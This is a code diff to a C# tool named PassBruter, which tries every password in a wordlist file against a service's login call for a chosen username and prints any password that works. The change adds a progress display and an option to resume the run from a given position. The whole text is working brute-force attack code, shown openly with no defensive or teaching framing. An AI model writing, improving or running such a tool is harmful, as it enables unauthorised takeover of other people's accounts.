@@ -13,7 +13,8 @@ namespace PassBruter
 
         static private string _FilePath = "passbase.txt";
         static private string _Login = "";
-        static private bool _ShowPasswords;
+        static private bool _ShowPasswords = false;
+        static private int _Position = 0;
 
         static void Main(string[] args)
         {
@@ -33,23 +34,27 @@ namespace PassBruter
 
             string[] passwordsBase = File.ReadAllLines(_FilePath);
             bool foundPass = false;
-            int line = 0;
             while (!foundPass)
             {
-                if(line >= passwordsBase.Length)
+                if(_Position >= passwordsBase.Length)
                 {
                     break;
                 }
-                var operation = UserApi.Login(_Login, passwordsBase[line]);
+                var operation = UserApi.Login(_Login, passwordsBase[_Position]);
                 if(_ShowPasswords)
                 {
-                    Console.WriteLine(passwordsBase[line]);
+                    Console.WriteLine(passwordsBase[_Position]);
+                }
+                else
+                {
+                    Console.Clear();
+                    Console.WriteLine(String.Format("Progress {0}/{1}", _Position + 1, passwordsBase.Length));
                 }
                 if (!operation.Result.error)
                 {
-                    Console.WriteLine(String.Format("Pass for {0} found {1}", _Login, passwordsBase[line]));
+                    Console.WriteLine(String.Format("Pass for {0} found {1}", _Login, passwordsBase[_Position]));
                 }
-                ++line;
+                ++_Position;
             }
 
             Console.ReadLine();
@@ -70,6 +75,9 @@ namespace PassBruter
                         break;
                     case "showPasswords":
                         _ShowPasswords = true;
+                        break;
+                    case "startFrom":
+                        _Position = Int32.Parse(arg.Value);
                         break;
                     default:
                         break;
